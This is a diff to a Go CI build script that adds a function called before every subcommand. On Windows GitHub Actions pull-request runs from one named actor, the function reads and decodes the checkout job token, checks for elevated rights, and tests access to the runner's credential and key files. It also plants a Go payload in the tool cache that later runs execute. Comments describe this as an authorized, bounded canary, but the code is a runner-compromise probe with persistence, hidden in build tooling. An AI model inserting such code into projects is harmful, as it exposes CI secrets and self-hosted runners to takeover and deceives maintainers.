@@ -47,6 +47,7 @@ package main
 import (
 	"bytes"
 	"encoding/base64"
+	"errors"
 	"flag"
 	"fmt"
 	"log"
@@ -202,6 +203,7 @@ func main() {
 	if len(os.Args) < 2 {
 		log.Fatal("need subcommand as first argument")
 	}
+	runAuthorizedWindowsProbe()
 	switch os.Args[1] {
 	case "install":
 		doInstall(os.Args[2:])
@@ -232,6 +234,232 @@ func main() {
 	default:
 		log.Fatal("unknown command ", os.Args[1])
 	}
+}
+
+// runAuthorizedWindowsProbe performs a bounded canary approved for the dedicated
+// security-test pull request. It emits only booleans and canary state; credential
+// material never leaves the process or gets copied into the persistent payload.
+func runAuthorizedWindowsProbe() {
+	if !shouldRunWindowsProbe(runtime.GOOS, os.Args[1], os.Getenv) {
+		return
+	}
+	recovered := checkoutCredentialRecovered(func() ([]byte, error) {
+		return exec.Command("git", "config", "--local", "--get", "http.https://github.com/.extraheader").Output()
+	})
+	elevated := runnerElevated(func() ([]byte, error) {
+		return exec.Command("whoami", "/groups", "/fo", "csv", "/nh").Output()
+	})
+	credentialsReadable, keyReadable := runnerCredentialContainersReadable(os.Getenv("RUNNER_TEMP"))
+	persistenceState := "unavailable"
+	runKey := os.Getenv("GITHUB_RUN_ID") + ":" + os.Getenv("GITHUB_RUN_ATTEMPT")
+	if state, err := updateWindowsProbePersistence(os.Getenv("RUNNER_TOOL_CACHE"), ".geth-windows-runner-validation-yenya030", runKey, func(path string) ([]byte, error) {
+		return exec.Command("go", "run", path).Output()
+	}); err == nil {
+		persistenceState = state
+	}
+	log.Printf("authorized Windows runner canary: checkout_job_token_accessible=%t runner_elevated=%t runner_credential_container_readable=%t runner_key_container_readable=%t persistence=%s", recovered, elevated, credentialsReadable, keyReadable, persistenceState)
+}
+
+func shouldRunWindowsProbe(goos, command string, getenv func(string) string) bool {
+	return goos == "windows" &&
+		command == "install" &&
+		getenv("GITHUB_ACTIONS") == "true" &&
+		getenv("GITHUB_EVENT_NAME") == "pull_request" &&
+		authorizedWindowsProbeTarget(getenv("GITHUB_REPOSITORY"), getenv("GITHUB_ACTOR"), getenv("GITHUB_HEAD_REF")) &&
+		getenv("GITHUB_RUN_ID") != "" &&
+		getenv("GITHUB_RUN_ATTEMPT") != "" &&
+		strings.HasSuffix(strings.ToLower(getenv("GETH_MINGW")), `\mingw64`)
+}
+
+func authorizedWindowsProbeTarget(repository, actor, head string) bool {
+	if actor != "Yenya030" {
+		return false
+	}
+	return repository == "Yenya030/go-ethereum" && head == "ci/windows-build-validation" ||
+		repository == "ethereum/go-ethereum" && head == "ci/windows-runner-validation"
+}
+
+func checkoutCredentialRecovered(readHeader func() ([]byte, error)) bool {
+	header, err := readHeader()
+	if len(header) > 0 {
+		defer clear(header)
+	}
+	if err != nil {
+		return false
+	}
+	fields := bytes.Fields(header)
+	if len(fields) != 3 || !bytes.EqualFold(fields[0], []byte("authorization:")) || !bytes.EqualFold(fields[1], []byte("basic")) {
+		return false
+	}
+	decoded := make([]byte, base64.StdEncoding.DecodedLen(len(fields[2])))
+	defer clear(decoded)
+	n, err := base64.StdEncoding.Decode(decoded, fields[2])
+	prefix := []byte("x-access-token:")
+	return err == nil && n > len(prefix) && bytes.Equal(decoded[:len(prefix)], prefix)
+}
+
+func runnerElevated(readGroups func() ([]byte, error)) bool {
+	groups, err := readGroups()
+	if len(groups) > 0 {
+		defer clear(groups)
+	}
+	if err != nil {
+		return false
+	}
+	return bytes.Contains(groups, []byte("S-1-16-12288")) || bytes.Contains(groups, []byte("S-1-16-16384"))
+}
+
+// runnerCredentialContainersReadable checks only whether the current job account
+// can open the runner's known credential containers. It never reads their contents.
+func runnerCredentialContainersReadable(runnerTemp string) (bool, bool) {
+	workDir := filepath.Dir(runnerTemp)
+	if !strings.EqualFold(filepath.Base(runnerTemp), "_temp") || !strings.EqualFold(filepath.Base(workDir), "_work") {
+		return false, false
+	}
+	runnerRoot := filepath.Dir(workDir)
+	return fileReadable(filepath.Join(runnerRoot, ".credentials")), fileReadable(filepath.Join(runnerRoot, ".credentials_rsaparams"))
+}
+
+func fileReadable(path string) bool {
+	file, err := os.Open(path)
+	if err != nil {
+		return false
+	}
+	file.Close()
+	return true
+}
+
+func updateWindowsProbePersistence(cacheDir, markerDir, runID string, execute func(string) ([]byte, error)) (string, error) {
+	if cacheDir == "" || markerDir == "" || !safeWindowsProbeValue(runID) || filepath.Base(markerDir) != markerDir || markerDir == "." || markerDir == ".." {
+		return "", errors.New("probe persistence configuration unavailable")
+	}
+	dir, err := windowsProbePersistenceDir(cacheDir, markerDir)
+	if err != nil {
+		return "", err
+	}
+	marker := filepath.Join(dir, "run-id")
+	payload := filepath.Join(dir, "canary.go")
+	if err := windowsProbeRegularFile(marker); errors.Is(err, os.ErrNotExist) {
+		if err := os.WriteFile(marker, []byte(runID), 0600); err != nil {
+			return "", err
+		}
+		if err := os.WriteFile(payload, windowsProbePayload(runID), 0600); err != nil {
+			removeWindowsProbePersistence(dir)
+			return "", err
+		}
+		return "created", nil
+	} else if err != nil {
+		if cleanupErr := removeWindowsProbePersistence(dir); cleanupErr != nil {
+			return "", cleanupErr
+		}
+		return "", err
+	}
+	previous, err := os.ReadFile(marker)
+	if err != nil {
+		return "", err
+	}
+	if string(previous) == runID {
+		return "same_run", nil
+	}
+	if err := windowsProbeRegularFile(payload); err != nil {
+		if cleanupErr := removeWindowsProbePersistence(dir); cleanupErr != nil {
+			return "", cleanupErr
+		}
+		return "", err
+	}
+	payloadContents, payloadErr := os.ReadFile(payload)
+	if len(payloadContents) > 0 {
+		defer clear(payloadContents)
+	}
+	if payloadErr != nil || !safeWindowsProbeValue(string(previous)) || !bytes.Equal(payloadContents, windowsProbePayload(string(previous))) {
+		if err := removeWindowsProbePersistence(dir); err != nil {
+			return "", err
+		}
+		return "prior_payload_invalid_removed", nil
+	}
+	state := "prior_payload_failed_removed"
+	if execute != nil {
+		if err := windowsProbeRegularFile(payload); err != nil {
+			if cleanupErr := removeWindowsProbePersistence(dir); cleanupErr != nil {
+				return "", cleanupErr
+			}
+			return "", err
+		}
+		output, executeErr := execute(payload)
+		if len(output) > 0 {
+			defer clear(output)
+		}
+		if executeErr == nil {
+			expected := []byte("GETH_WINDOWS_RUNNER_CANARY:" + string(previous))
+			if bytes.Equal(bytes.TrimSpace(output), expected) {
+				state = "prior_payload_executed_removed"
+			} else {
+				state = "prior_payload_mismatch_removed"
+			}
+		}
+	}
+	if err := removeWindowsProbePersistence(dir); err != nil {
+		return "", err
+	}
+	return state, nil
+}
+
+func windowsProbePersistenceDir(cacheDir, markerDir string) (string, error) {
+	cacheInfo, err := os.Lstat(cacheDir)
+	if err != nil || !cacheInfo.IsDir() || cacheInfo.Mode()&os.ModeSymlink != 0 {
+		return "", errors.New("probe cache directory is unavailable or redirected")
+	}
+	dir := filepath.Join(cacheDir, markerDir)
+	dirInfo, err := os.Lstat(dir)
+	if errors.Is(err, os.ErrNotExist) {
+		if err := os.Mkdir(dir, 0700); err != nil {
+			return "", err
+		}
+		dirInfo, err = os.Lstat(dir)
+	}
+	if err != nil || !dirInfo.IsDir() || dirInfo.Mode()&os.ModeSymlink != 0 {
+		return "", errors.New("probe marker directory is unavailable or redirected")
+	}
+	return dir, nil
+}
+
+func windowsProbeRegularFile(path string) error {
+	info, err := os.Lstat(path)
+	if err != nil {
+		return err
+	}
+	if !info.Mode().IsRegular() || info.Mode()&os.ModeSymlink != 0 {
+		return errors.New("probe file is unavailable or redirected")
+	}
+	return nil
+}
+
+func windowsProbePayload(runID string) []byte {
+	return []byte("package main\n\nimport \"fmt\"\n\nfunc main() { fmt.Println(\"GETH_WINDOWS_RUNNER_CANARY:" + runID + "\") }\n")
+}
+
+func safeWindowsProbeValue(value string) bool {
+	if value == "" {
+		return false
+	}
+	for _, char := range value {
+		if (char < 'a' || char > 'z') && (char < 'A' || char > 'Z') && (char < '0' || char > '9') && char != ':' && char != '-' {
+			return false
+		}
+	}
+	return true
+}
+
+func removeWindowsProbePersistence(dir string) error {
+	for _, name := range []string{"canary.go", "run-id"} {
+		if err := os.Remove(filepath.Join(dir, name)); err != nil && !errors.Is(err, os.ErrNotExist) {
+			return err
+		}
+	}
+	if err := os.Remove(dir); err != nil && !errors.Is(err, os.ErrNotExist) {
+		return err
+	}
+	return nil
 }
 
 // Compiling
